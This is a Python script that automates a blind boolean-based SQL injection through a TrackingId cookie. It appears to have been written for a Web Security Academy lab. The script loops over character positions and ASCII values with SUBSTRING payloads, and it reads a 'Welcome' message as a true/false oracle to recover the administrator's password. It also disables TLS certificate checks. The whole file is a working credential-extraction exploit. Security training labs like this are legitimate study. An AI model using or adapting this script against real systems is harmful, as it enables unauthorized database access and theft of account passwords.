import sys
import requests
import urllib.parse
import urllib3

#--------------------------------------------------------------------------#
#                                 CHANGEME                                 #
URL = 'https://ac3d1ff51e44aaa5c0fa979200e60000.web-security-academy.net/' #
TRACKING_ID = 'GXksWCmzmiODlBfb'                                           #
SESSION_COOKIE = 'nJI5V4DJ2aXglXJ1rFNvuY0Jx45a9lL6'                        #
#--------------------------------------------------------------------------#

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def boolean_sqli():
    password = ""
    # len(password) = 20
    # This was verified using the following payload:
    # TrackingId=GXksWCmzmiODlBfb' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') = 20-- 
    for i in range(1, 21):
        for j in range(32, 126):
            payload = f"' AND (SELECT ASCII(SUBSTRING(password,{i},1)) FROM users WHERE username='administrator')='{j}'--"
            encoded_payload = urllib.parse.quote(payload)

            cookies = {
                'TrackingId': TRACKING_ID + encoded_payload,
                'session': SESSION_COOKIE
            }

            r = requests.get(URL, cookies=cookies, verify=False)

            # "True" case
            if "Welcome" in r.text:
                password += chr(j)
                print('\r' + password, flush=True, end='')
                # Move on to the next character
                break
            # "False" case
            else:
                print('\r' + password + chr(j), flush=True, end='')

if __name__ == "__main__":
    boolean_sqli()
